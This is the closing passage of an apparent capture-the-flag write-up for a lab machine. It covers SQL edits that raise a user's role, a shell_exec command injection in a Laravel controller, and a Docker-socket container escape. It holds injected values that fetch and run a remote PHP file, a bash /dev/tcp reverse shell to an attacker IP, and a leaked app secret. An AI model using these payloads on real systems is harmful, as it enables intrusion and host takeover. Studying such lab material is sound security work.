+<pre tabindex="0"><code>MySQL [webapp]&gt; select * from users where email=&#39;gia@snippet.htb&#39;;
++-----+-----------+-----------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
+| id  | name      | email           | email_verified_at   | password                                                         | remember_token                                               | created_at          | updated_at          | user_type |
++-----+-----------+-----------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
+| 669 | Gia Stehr | gia@snippet.htb | 2022-01-02 20:15:30 | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | WAqftXHITcEIQb9oEeewvLnkSrvXmjAXHbaNoHWczqznwFiQLn1pm6S31l4x | 2022-01-02 20:15:37 | 2022-06-15 19:55:53 | Member    |
++-----+-----------+-----------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
+1 row in set (0.087 sec)
+
+MySQL [webapp]&gt; update users set user_type=&#39;Manager&#39; where email=&#39;gia@snippet.htb&#39;;
+Query OK, 1 row affected (0.049 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+</code></pre><h1 id="finding-pe-vector">finding PE vector</h1>
+<ul>
+<li>There is a folder /home/jean/projects/laravel-app/</li>
+<li>Search in the folder for dangerous php functions:</li>
+</ul>
+<pre tabindex="0"><code>&gt; grep -Ri &#39;shell_exec&#39;
+app/Http/Controllers/AdminController.php:            $res = shell_exec(&#34;ping -c1 -W1 $domain &gt; /dev/null &amp;&amp; echo &#39;Mail is valid!&#39; || echo &#39;Mail is not valid!&#39;&#34;);
+</code></pre><ul>
+<li>Read <code>app/Http/Controllers/AdminController.php</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminController</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Controller</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     * @throws ValidationException
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validateEmail</span>(<span style="color:#a6e22e">Request</span> $request)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $sec <span style="color:#f92672">=</span> <span style="color:#a6e22e">env</span>(<span style="color:#e6db74">&#39;APP_SECRET&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $email <span style="color:#f92672">=</span> <span style="color:#a6e22e">urldecode</span>($request<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;email&#39;</span>));
+</span></span><span style="display:flex;"><span>        $given <span style="color:#f92672">=</span> $request<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;cs&#39;</span>);
+</span></span><span style="display:flex;"><span>        $actual <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#34;sha256&#34;</span>, $sec <span style="color:#f92672">.</span> $email);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $array <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;@&#34;</span>, $email);
+</span></span><span style="display:flex;"><span>        $domain <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($array);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;email:&#34;</span> <span style="color:#f92672">.</span> $email);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;emailtrim:&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $email));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;domain:&#34;</span> <span style="color:#f92672">.</span> $domain);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;sec:&#34;</span> <span style="color:#f92672">.</span> $sec);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;given:&#34;</span> <span style="color:#f92672">.</span> $given);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;actual:&#34;</span> <span style="color:#f92672">.</span> $actual);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($given <span style="color:#f92672">!==</span> $actual) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">ValidationException</span><span style="color:#f92672">::</span><span style="color:#a6e22e">withMessages</span>([
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;email&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Invalid signature!&#34;</span>,
+</span></span><span style="display:flex;"><span>            ]);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;ping -c1 -W1 </span><span style="color:#e6db74">$domain</span><span style="color:#e6db74"> &gt; /dev/null &amp;&amp; echo &#39;Mail is valid!&#39; || echo &#39;Mail is not valid!&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Redirect</span><span style="color:#f92672">::</span><span style="color:#a6e22e">back</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">with</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">trim</span>($res));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="getting-into-the-container-again">Getting into the container again</h1>
+<ul>
+<li>From the code, there is a check using sha256 + APP_SECRET + urlencoded(email). And the secret is logged in the error log. However, after a while, these info cannot be found on the host. So, together with other evidence, there is a strong reason to believe that the laravel app must be running inside a container.</li>
+<li>Instead of trying to find the APP_SECRET, we can insert a new user into the users table so that the cs calculation is done for us.</li>
+</ul>
+<pre tabindex="0"><code>&gt; insert into users(name,email,email_verified_at,password,remember_token,created_at,updated_at,user_type) values(&#39;meow&#39;,&#39;meow@meow|curl http://10.10.16.27&#39;,&#39;2022-01-02 20:15:30&#39;,&#39;ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f&#39;,&#39;GyQelTmSl4TQJJJ8bZIAOX7cXNOy6yvibSQ2i8k6Cm0HSmrH0jL8QzCx33s6&#39;,&#39;2022-01-02 20:15:37&#39;,&#39;2022-06-15 19:55:53&#39;,&#39;Manager&#39;);
+</code></pre><ul>
+<li>Then, we can update this row to trial out payload</li>
+</ul>
+<pre tabindex="0"><code>&gt; update users set email=&#39;meow@meow|wget http://10.10.16.27/w.php -O w.php &amp;&amp; php w.php&#39; where name=&#39;meow&#39;;
+</code></pre><ul>
+<li>Now, we have a reverse shell to the target container</li>
+<li>Btw, APP_SECRET=T8pQxcZe1mcVcdtbZRSqSCDNIiTmaYZjPQsemzuj</li>
+</ul>
+<pre tabindex="0"><code>&gt; python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><h1 id="pe-from-the-container">PE from the container</h1>
+<ul>
+<li>Upload deepce.sh <a href="https://github.com/stealthcopter/deepce">https://github.com/stealthcopter/deepce</a></li>
+</ul>
+<pre tabindex="0"><code>[+] Dangerous Capabilities .. Yes
+Bounding set =cap_chown,`cap_dac_override`,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+
+[+] Docker sock mounted ....... Yes
+The docker sock is writable, we should be able to enumerate docker, create containers 
+and obtain root privs on the host machine
+See https://stealthcopter.github.io/deepce/guides/docker-sock.md 
+</code></pre><ul>
+<li>Docker socket is mounted and is writable, this may be used to escape the container</li>
+</ul>
+<pre tabindex="0"><code>&gt; find / -name docker.sock 2&gt;/dev/null
+/app/docker.sock
+&gt; ls -ls /app/docker.sock
+0 srw-rw---- 1 root app 0 Jul 28 04:34 /app/docker.sock
+</code></pre><ul>
+<li><a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25">https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># you can see images availables with</span>
+</span></span><span style="display:flex;"><span>&gt; curl -s --unix-socket /app/docker.sock http://localhost/images/json
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># here we have laravel-app_main:latest</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command executed when container is started</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># change dir to tmp where the root fs is mount and execute reverse shell</span>
+</span></span><span style="display:flex;"><span>cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[\&#34;/bin/sh\&#34;,\&#34;-c\&#34;,\&#34;chroot /tmp sh -c \\\&#34;bash -c &#39;bash -i &amp;&gt;/dev/tcp/10.10.16.27/5555 0&lt;&amp;1&#39;\\\&#34;\&#34;]&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create the container and execute command, bind the root filesystem to it, name the container meow_root and execute as detached (-d)</span>
+</span></span><span style="display:flex;"><span>curl -s -X POST --unix-socket /app/docker.sock -d <span style="color:#e6db74">&#34;{\&#34;Image\&#34;:\&#34;laravel-app_main\&#34;,\&#34;cmd\&#34;:</span>$cmd<span style="color:#e6db74">,\&#34;Binds\&#34;:[\&#34;/:/tmp:rw\&#34;]}&#34;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> http://localhost/containers/create?name<span style="color:#f92672">=</span>meow_root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># start the container</span>
+</span></span><span style="display:flex;"><span>curl -s -X POST --unix-socket /app/docker.sock <span style="color:#e6db74">&#34;http://localhost/containers/meow_root/start&#34;</span>
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
